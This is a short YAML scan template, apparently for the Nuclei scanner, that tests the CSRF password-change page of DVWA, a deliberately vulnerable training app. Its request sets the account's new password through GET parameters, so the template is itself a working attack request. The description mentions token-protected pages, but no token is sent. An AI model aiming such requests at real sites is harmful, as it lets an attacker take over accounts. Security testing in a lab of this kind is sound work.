id: CSRF_VALIDADO
info:
  name: CSRF para DVWA
  author: Fabian Morales
  severity: LOW
  description: CSRF Basico para los que contienen token.

variables:
  new_password: "NuevaContrase√±a123."

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?password_new={{new_password}}&password_conf={{new_password}}&Change=Change"
    matchers:
      - type: regex
        part: body
        regex:
          - "Password Changed"
        condition: or
      - type: status
        status:
          - 200